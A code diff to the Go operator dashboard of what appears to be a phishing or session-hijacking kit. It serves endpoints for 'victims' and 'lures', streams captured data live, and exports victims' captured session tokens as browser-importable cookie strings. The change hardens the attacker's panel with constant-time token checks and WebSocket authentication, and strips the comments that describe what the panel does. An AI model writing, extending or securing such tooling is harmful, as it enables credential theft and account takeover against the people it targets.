@@ -1,10 +1,12 @@
 package dashboard
 
 import (
+	"crypto/subtle"
 	"encoding/json"
 	"fmt"
 	"log"
 	"net/http"
+	"strings"
 	"sync"
 
 	"github.com/gorilla/websocket"
@@ -30,11 +32,15 @@ func NewServer(s *store.Store, l *lure.Generator, adminPass string) *Server {
 		adminPass: adminPass,
 		clients:   make(map[*websocket.Conn]bool),
 		upgrader: websocket.Upgrader{
-			CheckOrigin: func(r *http.Request) bool { return true },
+			CheckOrigin: func(r *http.Request) bool {
+				// Auth is enforced by wsAuthMiddleware (token param),
+				// so origin check is relaxed to allow any local access
+				// (0.0.0.0, 127.0.0.1, localhost, LAN IP, etc.)
+				return true
+			},
 		},
 	}
 
-	// Start broadcasting captured data in real-time
 	go srv.broadcastLoop()
 
 	return srv
@@ -44,31 +50,44 @@ func NewServer(s *store.Store, l *lure.Generator, adminPass string) *Server {
 func (s *Server) Start(addr string) error {
 	mux := http.NewServeMux()
 
-	// API endpoints
 	mux.HandleFunc("/api/stats", s.authMiddleware(s.handleStats))
 	mux.HandleFunc("/api/victims", s.authMiddleware(s.handleVictims))
 	mux.HandleFunc("/api/lures", s.authMiddleware(s.handleLures))
 	mux.HandleFunc("/api/lures/create", s.authMiddleware(s.handleCreateLure))
 	mux.HandleFunc("/api/sessions/export", s.authMiddleware(s.handleExportSession))
 
-	// WebSocket for real-time feed
-	mux.HandleFunc("/ws", s.handleWebSocket)
+	mux.HandleFunc("/ws", s.wsAuthMiddleware(s.handleWebSocket))
 
-	// Serve static dashboard UI
 	mux.HandleFunc("/", s.handleDashboardUI)
 
-	log.Printf("[🖥️  DASHBOARD] Operator panel ready → https://%s", addr)
+	log.Printf("[DASHBOARD] Operator panel ready at http://%s", addr)
 	return http.ListenAndServe(addr, mux)
 }
 
-func (s *Server) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
+// wsAuthMiddleware handles WebSocket auth via query param since browsers
+// cannot set custom headers on WebSocket upgrade requests.
+func (s *Server) wsAuthMiddleware(next http.HandlerFunc) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
-		// Check Authorization header
 		token := r.Header.Get("X-Admin-Token")
 		if token == "" {
 			token = r.URL.Query().Get("token")
 		}
-		if token != s.adminPass {
+		if subtle.ConstantTimeCompare([]byte(token), []byte(s.adminPass)) != 1 {
+			http.Error(w, `{"error":"Unauthorized"}`, http.StatusUnauthorized)
+			return
+		}
+		next(w, r)
+	}
+}
+
+func (s *Server) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		token := r.Header.Get("X-Admin-Token")
+		if token == "" {
+			token = r.Header.Get("Authorization")
+			token = strings.TrimPrefix(token, "Bearer ")
+		}
+		if subtle.ConstantTimeCompare([]byte(token), []byte(s.adminPass)) != 1 {
 			http.Error(w, `{"error":"Unauthorized"}`, http.StatusUnauthorized)
 			return
 		}
@@ -131,7 +150,6 @@ func (s *Server) handleExportSession(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Export as a cookie string that can be imported into a browser
 	var cookieLines []string
 	for name, value := range victim.Tokens {
 		cookieLines = append(cookieLines, fmt.Sprintf("%s=%s", name, value))
@@ -157,9 +175,8 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	s.clients[conn] = true
 	s.mu.Unlock()
 
-	log.Printf("[🖥️  DASHBOARD] Operator connected via WebSocket")
+	log.Printf("[DASHBOARD] Operator connected via WebSocket")
 
-	// Keep connection alive, remove on disconnect
 	for {
 		_, _, err := conn.ReadMessage()
 		if err != nil {
